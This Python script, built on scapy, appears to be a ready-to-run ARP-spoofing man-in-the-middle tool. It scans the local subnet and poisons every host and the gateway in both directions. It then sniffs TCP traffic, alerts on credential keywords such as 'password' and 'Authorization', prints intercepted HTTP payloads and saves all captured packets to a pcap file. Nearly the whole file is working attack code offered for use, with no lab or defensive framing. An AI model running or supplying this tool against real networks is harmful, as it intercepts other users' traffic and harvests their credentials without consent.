import os
import logging
import threading
import signal
import time
from scapy.all import *
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from mac_vendor_lookup import MacLookup

try:
    from playsound import playsound
except ImportError:
    playsound = None

conf.verb = 0
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
attacker_mac = get_if_hwaddr(conf.iface)
self_ip = conf.route.route("0.0.0.0")[1]
targets_backup = []
console = Console()
mac_lookup = MacLookup()
pcap_writer = PcapWriter("sniffed.pcap", append=True, sync=True)

suspicious_keywords = ["password", "admin", "login", "Authorization", "passwd"]

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=1)
    for _, rcv in ans:
        return rcv.hwsrc
    return None

def scan_lan(ip_range):
    console.print(f"[bold yellow][🔍] SCANNING LAN {ip_range}...[/]")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_range), timeout=2)
    return [(r.psrc, r.hwsrc) for s, r in ans]

def arp_poison(victim_ip, victim_mac, spoof_ip):
    pkt = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    while True:
        send(pkt, verbose=False)
        time.sleep(2)

def arp_restore(victim_ip, victim_mac, spoof_ip, spoof_mac):
    pkt = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(pkt, count=5, verbose=False)

def protocol_detector(pkt):
    try:
        if pkt.haslayer(Raw):
            payload = pkt[Raw].load.decode(errors="ignore")
            for keyword in suspicious_keywords:
                if keyword in payload.lower():
                    console.print(f"[red][🚨] SUSPICIOUS KEYWORD FOUND:[/] {keyword}")
                    if playsound:
                        threading.Thread(target=playsound, args=("alert.mp3",), daemon=True).start()

            if pkt.haslayer(IP):
                src = pkt[IP].src
                dst = pkt[IP].dst

                if "HTTP" in payload:
                    console.print(Panel.fit(
                        f"[cyan][HTTP] {src} > {dst}[/]\n{payload}",
                        title="HTTP Packet",
                        subtitle="💥 Intercepted"
                    ))
                elif "EHLO" in payload or "MAIL FROM:" in payload:
                    console.print(f"[magenta][SMTP] {src} > {dst}[/]")
                elif "FTP" in payload:
                    console.print(f"[green][FTP] {src} > {dst}[/]")
                elif "DNS" in payload:
                    console.print(f"[blue][DNS] {src} > {dst}[/]")

            pcap_writer.write(pkt)
    except Exception:
        pass

def start_sniff():
    console.print("[bold green][🔎] SNIFFER NYALA‼️[/]")
    sniff(filter="tcp", prn=protocol_detector, store=0)

def start_attack():
    global targets_backup

    subnet = ".".join(self_ip.split(".")[:3]) + ".1/24"
    gateway_ip = subnet.split("/")[0]
    gateway_mac = get_mac(gateway_ip)

    targets = scan_lan(subnet)
    console.print(f"[bold green][🎯] TOTAL TARGET: {len(targets)} - GASSKAN‼️[/]")

    table = Table(title="🔥 Target List", show_lines=True)
    table.add_column("IP", style="cyan")
    table.add_column("MAC", style="green")
    table.add_column("Vendor", style="magenta")

    for ip, mac in targets:
        if ip == self_ip or mac == attacker_mac:
            continue
        try:
            vendor = mac_lookup.lookup(mac)
        except:
            vendor = "Unknown"
        table.add_row(ip, mac, vendor)
        targets_backup.append((ip, mac))

        threading.Thread(target=arp_poison, args=(ip, mac, gateway_ip), daemon=True).start()
        threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, ip), daemon=True).start()

    console.print(table)
    threading.Thread(target=start_sniff, daemon=True).start()

    while True:
        time.sleep(1)

def restore_all():
    console.print(Text("🔁 RESTORE ARP TABLE... GASS", style="bold yellow"))
    gateway_ip = ".".join(self_ip.split(".")[:3]) + ".1"
    gateway_mac = get_mac(gateway_ip)

    for ip, mac in targets_backup:
        console.print(f"[yellow][🔧] RESTORE {ip}[/]")
        arp_restore(ip, mac, gateway_ip, gateway_mac)
        arp_restore(gateway_ip, gateway_mac, ip, mac)

    console.print("[bold green][✅] SEMUA BALIK NORMAL‼️[/]")

def stop_all(sig, frame):
    restore_all()
    console.print("[bold red][💤] CTRL+C DETECTED — EXITING...[/]")
    os._exit(0)

signal.signal(signal.SIGINT, stop_all)

# FULL SEND‼️
if __name__ == "__main__":
    start_attack()
